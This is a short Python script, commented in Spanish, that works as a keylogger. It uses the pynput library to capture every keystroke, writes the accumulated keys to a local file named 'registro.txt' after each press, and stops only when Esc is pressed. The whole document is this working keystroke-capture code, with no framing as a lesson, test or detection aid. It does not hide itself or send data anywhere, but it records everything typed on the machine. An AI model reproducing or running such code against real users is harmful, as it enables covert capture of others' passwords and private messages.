# Importar módulos necesarios
from pynput.keyboard import Key, Listener

# Lista para almacenar las teclas presionadas
registro_teclas = []

# Función para manejar la presión de una tecla
def manejar_presion(key):
    registro_teclas.append(key)
    convertir_a_texto(registro_teclas)

# Función para convertir teclas a texto y guardar en un archivo
def convertir_a_texto(registro_teclas):
    with open('registro.txt', 'w') as archivo_registro:
        for key in registro_teclas:
            key = str(key).replace("'", "")  # Eliminar comillas simples
            archivo_registro.write(key + ' ')

# Función para manejar la liberación de una tecla
def manejar_liberacion(key):
    if key == Key.esc:
        return False

# Configurar el listener de teclado
with Listener(on_press=manejar_presion, on_release=manejar_liberacion) as listener:
    listener.join()
